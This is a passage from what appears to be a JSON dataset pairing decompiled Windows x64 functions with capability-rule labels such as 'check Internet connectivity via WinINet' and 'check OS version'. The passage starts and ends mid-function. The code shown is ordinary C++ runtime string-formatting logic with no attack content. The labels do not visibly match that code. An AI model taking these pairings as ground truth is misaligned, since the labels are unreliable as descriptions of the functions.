1:\ncode_r0x00014003d3f8:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) goto code_r0x00014003d47a;\n                        if (puStack104 == &uStack88) {\n                            puVar10 = 0xf;\n                        }\n                        else {\n                            puVar10 = CONCAT71(Stack87, uStack88);\n                        }\n                        if (puVar10 < puStack184 + 1) {\n                            arg4_00 = NULL;\n                            fcn.1400a3380(&puStack104, puStack184, 0, 0);\n                        }\n                        puStack104[puStack184] = in_stack_00000028;\ncode_r0x00014003d448:\n                        puStack184 = puStack184 + 1;\n                        puStack96 = puStack184;\n                        puStack104[puStack184] = 0;\n                        break;\n                    case 2:\n                        if ((arg4[0x19] & 2) != 0) {\n                            puVar10 = piVar8[6];\n                            puVar7 = piVar8[5];\n                            if (puVar10 <= 0x3fffffffffffffff - puStack184) goto code_r0x00014003d4ce;\n                            fcn.1400b7170(0x1400fdd52);\n                            goto code_r0x00014003d3f8;\n                        }\n                        break;\n                    case 3:\n                        if (uStack248 != 0) {\n                            uVar2 = *puStack232;\n                            if (puStack104 == &uStack88) {\n                                puVar10 = 0xf;\n                            }\n                            else {\n                                puVar10 = CONCAT71(Stack87, uStack88);\n                            }\n                            if (puVar10 < puStack184 + 1) {\n                                arg4_00 = NULL;\n                                fcn.1400a3380(&puStack104, puStack184, 0, 0);\n                            }\n                            puStack104[puStack184] = uVar2;\n                            goto code_r0x00014003d448;\n                        }\n                        break;\n                    case 4:\n                        puVar7 = puStack136;\n                        puVar10 = puStack128;\n                        if (0x3fffffffffffffff - puStack184 < puStack128) goto code_r0x00014003d8b0;\ncode_r0x00014003d4ce:\n                        fcn.1400a31b0(&puStack104, puVar7, puVar10);\n                        puStack184 = puStack96;\n                    }\n                }\n                ppuVar14 = ppuVar14 + 1;\n            } while (ppuVar14 != &puStack136);\n            if (1 < uStack248) {\n                puVar13 = uStack248 - 1;\n                if (0x3fffffffffffffff - puStack184 < puVar13) {\n                    fcn.1400b7170(0x1400fdd52);\n                    goto code_r0x00014003d891;\n                }\n                fcn.1400a31b0(&puStack104, puStack232 + 1, puVar13);\n                puStack184 = puStack96;\n            }\n            if (puStack184 < puVar11) {\n                if (uVar16 == 0x20) {\n                    fcn.1400a1690(&puStack104, puStack184, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n                else {\n                    fcn.1400a1690(&puStack104, 0, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n            }\n            uVar15 = piVar18 & 0xffffffff;\n            if ((piVar18 == '\\0') &&\n               (iVar6 = (**(*piVar3 + 0x60))(piVar3, puStack104, puStack184),  puStack184 != iVar6)) {\n                uVar15 = 1;\n            }\n            piVar18 = piVar18 & 0xffffffffffffff00 | uVar15 & 0xff;\n            if (puStack104 != &uStack88) {\n                fcn.1400b64d0(puStack104);\n            }\n            if (puStack136 != &uStack120) {\n                fcn.1400b64d0();\n            }\ncode_r0x00014003d147:\n            *(arg4 + 0x10) = 0;\n            arg1[1] = piVar18;\n            *arg1 = piVar3;\n            return arg1;\n        }\n        uVar2 = *(piVar8 + 0x21);\n        arg2 = puStack128 + 1;\n        if (puStack136 == &uStack120) {\n            puVar12 = 0xf;\n        }\n        else {\n            puVar12 = CONCAT71(Stack119, uStack120);\n        }\n        if (puVar12 < arg2) {\n            arg4_00 = NULL;\n            fcn.1400a3380(&puStack136, puStack128, 0, 0);\n        }\n        puStack136[puVar10] = uVar2;\n        (puStack136 + 1)[puVar10] = 0;\n        puStack128 = arg2;\n        if (iVar17 < 0) {\n            arg4_00 = -iVar17;\n            fcn.1400a1690(&puStack136, arg2, 0, arg4_00);\n            if (0x3fffffffffffffff - puStack128 < puVar13) goto code_r0x00014003d8bc;\ncode_r0x00014003d66a:\n            fcn.1400a31b0(&puStack136, puVar11, puVar13);\n            goto code_r0x00014003d291;\n        }\n        puVar13 = *(piVar8 + 0xb);\n        puVar11 = puVar11 + iVar17;\n        if (puVar13 <= 0x3fffffffffffffff - arg2) goto code_r0x00014003d66a;\ncode_r0x00014003d891:\n        fcn.1400b7170(0x1400fdd52);\n        puVar10 = puVar13;\n    }\n    else {\n        if (iVar5 < 0) {\n            iVar17 = puVar13;\n        }\n        if (piVar8[3] == 0) {\n            arg4_00 = puVar11;\n            fcn.1400a0b80(&puStack136, 0, puStack128, puVar11);\n            iVar5 = *(piVar8 + 0xb);\n            goto code_r0x00014003d27c;\n        }\n        fcn.1400a1690(&puStack136, 0, puStack128, iVar17 * 2);\n        puVar7 = fcn.1400b0000(puStack136, *(piVar8 + 0x22), piVar8[2], piVar8[3]);\n        puVar10 = puVar7 + -puStack136;\n        arg4_00 = puStack128;\n        if (puVar10 <= puStack128) {\n            *puVar7 = 0;\n            iVar5 = *(piVar8 + 0xb);\n            puStack128 = puVar10;\n            goto code_r0x00014003d27c;\n        }\n    }\n    fcn.1400b1a60(0x1400fdda8, 0x1400fdd94, puVar10, arg4_00);\ncode_r0x00014003d8b0:\n    fcn.1400b7170(0x1400fdd52);\ncode_r0x00014003d8bc:\n    uVar9 = fcn.1400b7170(0x1400fdd52);\n    fcn.1400b6670(uVar9);\n    (**(*piVar8 + 8))(piVar8);\n    do {\n        uVar9 = fcn.1400b6b70();\n        fcn.1400b6670(uVar9);\n    } while( true );\n}\n",
        "token_count": 3226
    },
    "14003d94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14003d940(int64_t **arg1, ulong noname_1, int64_t **arg3, uint8_t *arg4)\n\n{\n    uint8_t *arg2;\n    int64_t **ppiVar1;\n    uchar uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t arg3_00;\n    uchar *puVar7;\n    int64_t *piVar8;\n    ulong uVar9;\n    uint8_t *puVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uchar **ppuVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint8_t *arg4_00;\n    int32_t iVar17;\n    int64_t *piVar18;\n    uchar in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack248;\n    uchar *puStack232;\n    uint8_t *puStack216;\n    uint8_t *puStack184;\n    uint uStack140;\n    uchar *puStack136;\n    uint8_t *puStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint8_t *puStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    \n    piVar3 = *arg3;\n    piVar18 = arg3[1];\n    arg4_00 = arg4;\n    iVar6 = fcn.1400b36a0(arg4 + 0xd0);\n    arg3_00 = fcn.1400261c0(0x1400fb790);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + arg3_00 * 8;\n    piVar8 = *ppiVar1;\n    if (piVar8 == NULL) {\n        piVar8 = fcn.1400b6520(0x70);\n        *(piVar8 + 1) = 0;\n        iVar4 = *0x1401033e0;\n        piVar8[2] = 0;\n        piVar8[3] = 0;\n        *piVar8 = iVar4 + 0x10;\n        *(piVar8 + 4) = 0;\n        *(piVar8 + 0x21) = 0;\n        piVar8[5] = 0;\n        piVar8[6] = 0;\n        piVar8[7] = 0;\n        piVar8[8] = 0;\n        piVar8[9] = 0;\n        piVar8[10] = 0;\n        *(piVar8 + 0xb) = 0;\n        *(piVar8 + 0x5c) = 0;\n        *(piVar8 + 0x6f) = 0;\n        fcn.14009a5d0(piVar8, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), piVar8, arg3_00);\n        piVar8 = *ppiVar1;\n    }\n    puVar11 = *in_stack_00000030;\n    if (*puVar11 == *(piVar8 + 100)) {\n        uStack140 = *(piVar8 + 0xc);\n        puStack232 = piVar8[9];\n        uStack248 = piVar8[10];\n        if (in_stack_00000030[1] == NULL) goto code_r0x00014003da17;\n        puVar11 = puVar11 + 1;\n    }\n    else {\n        uStack140 = *(piVar8 + 0x5c);\n        puStack232 = piVar8[7];\n        uStack248 = piVar8[8];\n    }\n    puVar10 = in_stack_00000030[1] + puVar11;\n    if (puVar10 <= puVar11) goto code_r0x00014003da17;\n    puVar13 = puVar11;\n    do {\n        if ((*(*(iVar6 + 0x30) + *puVar13 * 2) & 8) == 0) break;\n        puVar13 = puVar13 + 1;\n    } while (puVar10 != puVar13);\n    puVar13 = puVar13 + -puVar11;\n    if (puVar13 == NULL) goto code_r0x00014003da17;\n    puStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400a3070(&puStack136, puVar13 * 2);\n    iVar5 = *(piVar8 + 0xb);\n    iVar17 = puVar13 - iVar5;\n    if (iVar17 < 1) {\ncode_r0x00014003db4c:\n        puVar10 = puStack128;\n        if (iVar5 < 1) {\ncode_r0x00014003db61:\n            uVar16 = *(arg4 + 0x18) & 0xb0;\n            puStack216 = puStack128 + uStack248;\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                puStack216 = puStack216 + piVar8[6];\n            }\n            puStack96 = NULL;\n            uStack88 = 0;\n            puStack104 = &uStack88;\n            fcn.1400a3070(&puStack104, puStack216 * 2);\n            puVar11 = *(arg4 + 0x10);\n            ppuVar14 = &uStack140;\n            puStack184 = puStack96;\n            do {\n                if (*ppuVar14 < 5) {\n    // switch table (5 cases) at 0x1400fdde0\n                    switch(*ppuVar14) {\n                    case 0:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) {\ncode_r0x00014003dd4a:\n                            arg4_00 = puVar11 + -puStack216;\n                            fcn.1400a1690(&puStack104, puStack184, 0, arg4_00);\n                            puStack184 = puStack96;\n                        }\n                        break;\n                    case 1:\ncode_r0x00014003dcc8:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) goto code_r0x00014003dd4a;\n                        if (puStack104 == &uStack88) {\n                            puVar10 = 0xf;\n                        }\n                        else {\n                            puVar10 = CONCAT71(Stack87, uStack88);\n                        }\n                        if (puVar10 < puStack184 + 1) {\n                            arg4_00 = NULL;\n                            fcn.1400a3380(&puStack104, puStack184, 0, 0);\n                        }\n                        puStack104[puStack184] = in_stack_00000028;\ncode_r0x00014003dd18:\n                        puStack184 = puStack184 + 1;\n                        puStack96 = puStack184;\n                        puStack104[puStack184] = 0;\n                        break;\n                    case 2:\n                        if ((arg4[0x19] & 2) != 0) {\n                            puVar10 = piVar8[6];\n                            puVar7 = piVar8[5];\n                            if (puVar10 <= 0x3fffffffffffffff - puStack184) goto code_r0x00014003dd9e;\n                            fcn.1400b7170(0x1400fdd52);\n                            goto code_r0x00014003dcc8;\n                        }\n                        break;\n                    case 3:\n                        if (uStack248 != 0) {\n                            uVar2 = *puStack232;\n                            if (puStack104 == &uStack88) {\n                                puVar10 = 0xf;\n                            }\n                            else {\n                                puVar10 = CONCAT71(Stack87, uStack88);\n                            }\n                            if (puVar10 < puStack184 + 1) {\n                                arg4_00 = NULL;\n                                fcn.1400a3380(&puStack104, puStack184, 0, 0);\n                            }\n                            puStack104[puStack184] = uVar2;\n                            goto code_r0x00014003dd18;\n                        }\n                        break;\n                    case 4:\n                        puVar7 = puStack136;\n                        puVar10 = puStack128;\n                        if (0x3fffffffffffffff - puStack184 < puStack128) goto code_r0x00014003e180;\ncode_r0x00014003dd9e:\n                        fcn.1400a31b0(&puStack104, puVar7, puVar10);\n                        puStack184 = puStack96;\n                    }\n                }\n                ppuVar14 = ppuVar14 + 1;\n            } while (ppuVar14 != &puStack136);\n            if (1 < uStack248) {\n                puVar13 = uStack248 - 1;\n                if (0x3fffffffffffffff - puStack184 < puVar13) {\n                    fcn.1400b7170(0x1400fdd52);\n                    goto code_r0x00014003e161;\n                }\n                fcn.1400a31b0(&puStack104, puStack232 + 1, puVar13);\n                puStack184 = puStack96;\n            }\n            if (puStack184 < puVar11) {\n                if (uVar16 == 0x20) {\n                    fcn.1400a1690(&puStack104, puStack184, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n                else {\n                    fcn.1400a1690(&puStack104, 0, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n            }\n            uVar15 = piVar18 & 0xffffffff;\n            if ((piVar18 == '\\0') &&\n               (iVar6 = (**(*piVar3 + 0x60))(piVar3, puStack104, puStack184),  puStack184 != iVar6)) {\n                uVar15 = 1;\n            }\n            piVar18 = piVar18 & 0xffffffffffffff00 | uVar15 & 0xff;\n            if (puStack104 != &uStack88) {\n                fcn.1400b64d0(puStack104);\n            }\n            if (puStack136 != &uStack120) {\n                fcn.1400b64d0();\n            }\ncode_r0x00014003da17:\n            *(arg4 + 0x10) = 0;\n            arg1[1] = piVar18;\n            *arg1 = piVar3;\n            return arg1;\n        }\n        uVar2 = *(piVar8 + 0x21);\n        arg2 = puStack128 + 1;\n        if (puStack136 == &uStack120) {\n            puVar12 = 0xf;\n        }\n        else {\n            puVar12 = CONCAT71(Stack119, uStack120);\n        }\n        if (puVar12 < arg2) {\n            arg4_00 = NULL;\n            fcn.1400a3380(&puStack136, puStack128, 0, 0);\n        }\n        puStack136[puVar10] = uVar2;\n        (puStack136 + 1)[puVar10] = 0;\n        puStack128 = arg2;\n        if (iVar17 < 0) {\n            arg4_00 = -iVar17;\n            fcn.1400a1690(&puStack136, arg2, 0, arg4_00);\n            if (0x3fffffffffffffff - puStack128 < puVar13) goto code_r0x00014003e18c;\ncode_r0x00014003df3a:\n            fcn.1400a31b0(&puStack136, puVar11, puVar13);\n            goto code_r0x00014003db61;\n        }\n        puVar13 = *(piVar8 + 0xb);\n        puVar11 = puVar11 + iVar17;\n        if (puVar13 <= 0x3fffffffffffffff - arg2) goto code_r0x00014003df3a;\ncode_r0x00014003e161:\n        fcn.1400b7170(0x1400fdd52);\n        puVar10 = puVar13;\n    }\n    else {\n        if (iVar5 < 0) {\n            iVar17 = puVar13;\n        }\n        if (piVar8[3] == 0) {\n            arg4_00 = puVar11;\n            fcn.1400a0b80(&puStack136, 0, puStack128, puVar11);\n            iVar5 = *(piVar8 + 0xb);\n            goto code_r0x00014003db4c;\n        }\n        fcn.1400a1690(&puStack136, 0, puStack128, iVar17 * 2);\n        puVar7 = fcn.1400b0000(puStack136, *(piVar8 + 0x22), piVar8[2], piVar8[3]);\n        puVar10 = puVar7 + -puStack136;\n        arg4_00 = puStack128;\n        if (puVar10 <= puStack128) {\n            *puVar7 = 0;\n            iVar5 = *(piVar8 + 0xb);\n            puStack128 = puVar10;\n            goto code_r0x00014003db4c;\n        }\n    }\n    fcn.1400b1a60(0x1400fdda8, 0x1400fdd94, puVar10, arg4_00);\ncode_r0x00014003e180:\n    fcn.1400b7170(0x1400fdd52);\ncode_r0x00014003e18c:\n    uVar9 = fcn.1400b7170(0x1400fdd52);\n    fcn.1400b6670(uVar9);\n    (**(*piVar8 + 8))(piVar8);\n    do {\n        uVar9 = fcn.1400b6b70();\n        fcn.1400b6670(uVar9);\n    } while( true );\n}\n",
        "token_count": 3220
    },
    "14003e56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14003e560(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    int64_t **ppiVar2;\n    int16_t *arg2;\n    ushort uVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    ulong uVar11;\n    bool bVar12;\n    ushort *puVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    int32_t iVar16;\n    uint64_t arg2_00;\n    uint32_t uVar17;\n    ushort **ppuVar18;\n    int16_t *piVar19;\n    int16_t *piVar20;\n    int64_t *piVar21;\n    int16_t *arg3_00;\n    uint64_t uVar22;\n    ushort in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack232;\n    ushort *puStack208;\n    uint uStack140;\n    ushort *puStack136;\n    int16_t *piStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ushort *puStack104;\n    uint64_t uStack96;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    \n    piVar4 = *arg3;\n    piVar21 = arg3[1];\n    piVar8 = fcn.1400b3700(arg4 + 0xd0);\n    iVar9 = fcn.1400261c0(0x1400fb7a0);\n    ppiVar2 = *(*(arg4 + 0xd0) + 0x18) + iVar9 * 8;\n    piVar10 = *ppiVar2;\n    if (piVar10 == NULL) {\n        piVar10 = fcn.1400b6520(0x80);\n        *(piVar10 + 1) = 0;\n        iVar6 = *0x1401033f0;\n        piVar10[2] = 0;\n        piVar10[3] = 0;\n        *piVar10 = iVar6 + 0x10;\n        *(piVar10 + 4) = 0;\n        *(piVar10 + 0x22) = 0;\n        piVar10[5] = 0;\n        piVar10[6] = 0;\n        piVar10[7] = 0;\n        piVar10[8] = 0;\n        piVar10[9] = 0;\n        piVar10[10] = 0;\n        *(piVar10 + 0xb) = 0;\n        *(piVar10 + 0x5c) = 0;\n        *(piVar10 + 0x7a) = 0;\n        fcn.14009ae00(piVar10, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), piVar10, iVar9);\n        piVar10 = *ppiVar2;\n    }\n    piVar14 = *in_stack_00000030;\n    if (*piVar14 == *(piVar10 + 100)) {\n        uStack140 = *(piVar10 + 0xc);\n        puStack208 = piVar10[9];\n        uStack232 = piVar10[10];\n        if (in_stack_00000030[1] != NULL) {\n            piVar14 = piVar14 + 1;\n        }\n    }\n    else {\n        uStack140 = *(piVar10 + 0x5c);\n        puStack208 = piVar10[7];\n        uStack232 = piVar10[8];\n    }\n    piVar20 = piVar14 + in_stack_00000030[1];\n    iVar9 = (**(*piVar8 + 0x28))(piVar8, 8);\n    arg3_00 = iVar9 - piVar14 >> 1;\n    if (arg3_00 == NULL) goto code_r0x00014003e62e;\n    piStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400a6b00(&puStack136, iVar9 - piVar14);\n    iVar7 = *(piVar10 + 0xb);\n    iVar16 = arg3_00 - iVar7;\n    if (0 < iVar16) {\n        if (iVar7 < 0) {\n            iVar16 = arg3_00;\n        }\n        if (piVar10[3] == 0) {\n            piVar20 = piVar14;\n            fcn.1400a46d0(&puStack136, 0, piStack128, piVar14);\n            iVar7 = *(piVar10 + 0xb);\n        }\n        else {\n            fcn.1400a5030(&puStack136, 0, piStack128, iVar16 * 2);\n            puVar13 = puStack136;\n            iVar9 = fcn.1400b0190(puStack136, *(piVar10 + 0x24), piVar10[2], piVar10[3]);\n            piVar19 = iVar9 - puVar13 >> 1;\n            piVar20 = piStack128;\n            if (piStack128 < piVar19) goto code_r0x00014003ed7c;\n            *(puStack136 + (iVar9 - puVar13)) = 0;\n            iVar7 = *(piVar10 + 0xb);\n            piStack128 = piVar19;\n        }\n    }\n    piVar19 = piStack128;\n    if (0 < iVar7) {\n        uVar3 = *(piVar10 + 0x22);\n        arg2 = piStack128 + 1;\n        if (puStack136 == &uStack120) {\n            piVar20 = 0x7;\n        }\n        else {\n            piVar20 = CONCAT62(Stack118, uStack120);\n        }\n        if (piVar20 < arg2) {\n            fcn.1400a6e10(&puStack136, piStack128, 0, 0);\n        }\n        piVar20 = NULL;\n        puStack136[piVar19] = uVar3;\n        puStack136[piVar19 + 1] = 0;\n        piStack128 = arg2;\n        if (iVar16 < 0) {\n            piVar19 = NULL;\n            piVar20 = -iVar16;\n            fcn.1400a5030(&puStack136, arg2, 0, piVar20);\n            if (arg3_00 <= 0x1fffffffffffffff - piStack128) goto code_r0x00014003eb09;\ncode_r0x00014003ed58:\n            fcn.1400b7170(0x1400fe0e2);\ncode_r0x00014003ed64:\n            fcn.1400b7170(0x1400fe0e2);\n            arg3_00 = piVar19;\n        }\n        else {\n            arg3_00 = *(piVar10 + 0xb);\n            piVar14 = piVar14 + iVar16;\n            if (arg3_00 <= 0x1fffffffffffffff - arg2) {\ncode_r0x00014003eb09:\n                fcn.1400a6c40(&puStack136, piVar14, arg3_00);\n                goto code_r0x00014003e786;\n            }\n        }\n        fcn.1400b7170(0x1400fe0e2);\n        piVar19 = arg3_00;\ncode_r0x00014003ed7c:\n        uVar11 = fcn.1400b1a60(0x1400fe138, 0x1400fe124, piVar19, piVar20);\n        fcn.1400b6670(uVar11);\n        (**(*piVar10 + 8))(piVar10);\n        do {\n            uVar11 = fcn.1400b6b70();\n            fcn.1400b6670(uVar11);\n        } while( true );\n    }\ncode_r0x00014003e786:\n    uVar17 = *(arg4 + 0x18) & 0xb0;\n    uVar22 = uStack232 + piStack128;\n    if ((*(arg4 + 0x18) & 0x200) != 0) {\n        uVar22 = uVar22 + piVar10[6];\n    }\n    uStack96 = 0;\n    uStack88 = 0;\n    puStack104 = &uStack88;\n    fcn.1400a6b00(&puStack104, uVar22 * 2);\n    uVar5 = *(arg4 + 0x10);\n    ppuVar18 = &uStack140;\n    bVar12 = uVar17 == 0x10 && uVar22 < uVar5;\n    arg2_00 = uStack96;\n    do {\n        if (*ppuVar18 < 5) {\n    // switch table (5 cases) at 0x1400fe184\n            switch(*ppuVar18) {\n            case 0:\n                if (bVar12) {\ncode_r0x00014003e947:\n                    piVar20 = uVar5 - uVar22;\n                    fcn.1400a5030(&puStack104, arg2_00, 0, piVar20);\n                    arg2_00 = uStack96;\n                }\n                break;\n            case 1:\ncode_r0x00014003e8e0:\n                if (bVar12) goto code_r0x00014003e947;\n                uVar1 = arg2_00 + 1;\n                if (puStack104 == &uStack88) {\n                    uVar15 = 7;\n                }\n                else {\n                    uVar15 = CONCAT62(Stack86, uStack88);\n                }\n                if (uVar15 < uVar1) {\n                    piVar20 = NULL;\n                    fcn.1400a6e10(&puStack104, arg2_00, 0, 0);\n                }\n                puStack104[arg2_00] = in_stack_00000028;\n                uStack96 = uVar1;\n                puStack104[arg2_00 + 1] = 0;\n                arg2_00 = uVar1;\n                break;\n            case 2:\n                if ((*(arg4 + 0x19) & 2) != 0) {\n                    piVar14 = piVar10[6];\n                    puVar13 = piVar10[5];\n                    if (piVar14 <= 0x1fffffffffffffff - arg2_00) goto code_r0x00014003e996;\n                    fcn.1400b7170(0x1400fe0e2);\n                    goto code_r0x00014003e8e0;\n                }\n                break;\n            case 3:\n                if (uStack232 != 0) {\n                    uVar3 = *puStack208;\n                    uVar1 = arg2_00 + 1;\n                    if (puStack104 == &uStack88) {\n                        uVar15 = 7;\n                    }\n                    else {\n                        uVar15 = CONCAT62(Stack86, uStack88);\n                    }\n                    if (uVar15 < uVar1) {\n                        piVar20 = NULL;\n                        fcn.1400a6e10(&puStack104, arg2_00, 0, 0);\n                    }\n                    puStack104[arg2_00] = uVar3;\n                    uStack96 = uVar1;\n                    puStack104[arg2_00 + 1] = 0;\n                    arg2_00 = uVar1;\n                }\n                break;\n            case 4:\n                puVar13 = puStack136;\n                piVar14 = piStack128;\n                if (0x1fffffffffffffff - arg2_00 < piStack128) {\n                    piVar19 = piStack128;\n                    fcn.1400b7170(0x1400fe0e2);\n                    goto code_r0x00014003ed58;\n                }\ncode_r0x00014003e996:\n                fcn.1400a6c40(&puStack104, puVar13, piVar14);\n                arg2_00 = uStack96;\n            }\n        }\n        ppuVar18 = ppuVar18 + 1;\n    } while (&puStack136 != ppuVar18);\n    if (1 < uStack232) {\n        piVar19 = uStack232 - 1;\n        if (0x1fffffffffffffff - arg2_00 < piVar19) goto code_r0x00014003ed64;\n        fcn.1400a6c40(&puStack104, puStack208 + 1, piVar19);\n        arg2_00 = uStack96;\n    }\n    if (arg2_00 < uVar5) {\n        if (uVar17 == 0x20) {\n            fcn.1400a5030(&puStack104, arg2_00, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n        else {\n            fcn.1400a5030(&puStack104, 0, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n    }\n    uVar22 = piVar21 & 0xffffffff;\n    if ((piVar21 == '\\0') && (iVar9 = (**(*piVar4 + 0x60))(piVar4, puStack104, arg2_00),  arg2_00 != iVar9)) {\n        uVar22 = 1;\n    }\n    piVar21 = piVar21 & 0xffffffffffffff00 | uVar22 & 0xff;\n    if (puStack104 != &uStack88) {\n        fcn.1400b64d0(puStack104);\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400b64d0();\n    }\ncode_r0x00014003e62e:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar21;\n    *arg1 = piVar4;\n    return;\n}\n",
        "token_count": 3198
    },
    "14003ee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14003ee00(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    int64_t **ppiVar2;\n    int16_t *arg2;\n    ushort uVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    ulong uVar11;\n    bool bVar12;\n    ushort *puVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    int32_t iVar16;\n    uint64_t arg2_00;\n    uint32_t uVar17;\n    ushort **ppuVar18;\n    int16_t *piVar19;\n    int16_t *piVar20;\n    int64_t *piVar21;\n    int16_t *arg3_00;\n    uint64_t uVar22;\n    ushort in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack232;\n    ushort *puStack208;\n    uint uStack140;\n    ushort *puStack136;\n    int16_t *piStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ushort *puStack104;\n    uint64_t uStack96;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    \n    piVar4 = *arg3;\n    piVar21 = arg3[1];\n    piVar8 = fcn.1400b3700(arg4 + 0xd0);\n    iVar9 = fcn.1400261c0(0x1400fb7b0);\n    ppiVar2 = *(*(arg4 + 0xd0) + 0x18) + iVar9 * 8;\n    piVar10 = *ppiVar2;\n    if (piVar10 == NULL) {\n        piVar10 = fcn.1400b6520(0x80);\n        *(piVar10 + 1) = 0;\n        iVar6 = *0x140103400;\n        piVar10[2] = 0;\n        piVar10[3] = 0;\n        *piVar10 = iVar6 + 0x10;\n        *(piVar10 + 4) = 0;\n        *(piVar10 + 0x22) = 0;\n        piVar10[5] = 0;\n        piVar10[6] = 0;\n        piVar10[7] = 0;\n        piVar10[8] = 0;\n        piVar10[9] = 0;\n        piVar10[10] = 0;\n        *(piVar10 + 0xb) = 0;\n        *(piVar10 + 0x5c) = 0;\n        *(piVar10 + 0x7a) = 0;\n        fcn.14009b620(piVar10, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), piVar10, iVar9);\n        piVar10 = *ppiVar2;\n    }\n    piVar14 = *in_stack_00000030;\n    if (*piVar14 == *(piVar10 + 100)) {\n        uStack140 = *(piVar10 + 0xc);\n        puStack208 = piVar10[9];\n        uStack232 = piVar10[10];\n        if (in_stack_00000030[1] != NULL) {\n            piVar14 = piVar14 + 1;\n        }\n    }\n    else {\n        uStack140 = *(piVar10 + 0x5c);\n        puStack208 = piVar10[7];\n        uStack232 = piVar10[8];\n    }\n    piVar20 = piVar14 + in_stack_00000030[1];\n    iVar9 = (**(*piVar8 + 0x28))(piVar8, 8);\n    arg3_00 = iVar9 - piVar14 >> 1;\n    if (arg3_00 == NULL) goto code_r0x00014003eece;\n    piStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400a6b00(&puStack136, iVar9 - piVar14);\n    iVar7 = *(piVar10 + 0xb);\n    iVar16 = arg3_00 - iVar7;\n    if (0 < iVar16) {\n        if (iVar7 < 0) {\n            iVar16 = arg3_00;\n        }\n        if (piVar10[3] == 0) {\n            piVar20 = piVar14;\n            fcn.1400a46d0(&puStack136, 0, piStack128, piVar14);\n            iVar7 = *(piVar10 + 0xb);\n        }\n        else {\n            fcn.1400a5030(&puStack136, 0, piStack128, iVar16 * 2);\n            puVar13 = puStack136;\n            iVar9 = fcn.1400b0190(puStack136, *(piVar10 + 0x24), piVar10[2], piVar10[3]);\n            piVar19 = iVar9 - puVar13 >> 1;\n            piVar20 = piStack128;\n            if (piStack128 < piVar19) goto code_r0x00014003f61c;\n            *(puStack136 + (iVar9 - puVar13)) = 0;\n            iVar7 = *(piVar10 + 0xb);\n            piStack128 = piVar19;\n        }\n    }\n    piVar19 = piStack128;\n    if (0 < iVar7) {\n        uVar3 = *(piVar10 + 0x22);\n        arg2 = piStack128 + 1;\n        if (puStack136 == &uStack120) {\n            piVar20 = 0x7;\n        }\n        else {\n            piVar20 = CONCAT62(Stack118, uStack120);\n        }\n        if (piVar20 < arg2) {\n            fcn.1400a6e10(&puStack136, piStack128, 0, 0);\n        }\n        piVar20 = NULL;\n        puStack136[piVar19] = uVar3;\n        puStack136[piVar19 + 1] = 0;\n        piStack128 = arg2;\n        if (iVar16 < 0) {\n            piVar19 = NULL;\n            piVar20 = -iVar16;\n            fcn.1400a5030(&puStack136, arg2, 0, piVar20);\n            if (arg3_00 <= 0x1fffffffffffffff - piStack128) goto code_r0x00014003f3a9;\ncode_r0x00014003f5f8:\n            fcn.1400b7170(0x1400fe0e2);\ncode_r0x00014003f604:\n            fcn.1400b7170(0x1400fe0e2);\n            